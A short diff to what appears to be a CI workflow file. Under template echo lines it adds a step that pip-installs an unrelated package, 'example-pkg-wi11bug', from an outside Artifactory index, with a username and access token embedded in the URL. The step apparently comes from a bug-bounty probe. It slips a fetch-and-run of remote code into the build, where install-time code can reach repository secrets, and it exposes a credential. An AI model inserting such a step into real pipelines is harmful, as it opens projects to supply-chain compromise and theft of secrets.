@@ -34,3 +34,4 @@ jobs:
         run: |
           echo Add other actions to build,
           echo test, and deploy your project.
+          python3 -m pip install --index-url https://wi11@wearehackerone.com:APB2zRSy9fK1MXz6ZWUcb8o4Tdi@wi11.jfrog.io/artifactory/api/pypi/repo-key22/simple --no-deps example-pkg-wi11bug
